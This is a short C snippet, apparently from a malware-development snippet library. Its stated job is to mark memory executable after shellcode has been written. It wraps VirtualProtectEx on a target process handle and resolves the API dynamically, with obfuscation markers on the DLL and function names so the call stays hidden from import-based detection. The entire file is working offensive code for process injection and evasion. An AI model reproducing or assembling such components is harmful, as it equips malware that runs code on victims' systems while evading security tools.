// Description: Change RW memory to RX after writing shellcode
// Used WinAPIs: VirtualProtect
// IOCS strings:
BOOL ProtectMemory(HANDLE process, LPVOID baseAddress, SIZE_T size, DWORD protection) {
    typedef BOOL (WINAPI * VirtualProtectEx_) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    VirtualProtectEx_ _VirtualProtectEx = (VirtualProtectEx_)GetProcAddress(GetModuleHandleA(<obf>"kernel32.dll"<ob_end>), <obf>"VirtualProtectEx"<ob_end>);
    DWORD oldProtection = 0;
    BOOL status = _VirtualProtectEx(process, baseAddress, size, protection, &oldProtection);
    #ifdef DEBUG
        if (!status) {
            printf("[-] VirtualProtectEx failed (%d)\n", GetLastError());
        }
    #endif
    return status;
}
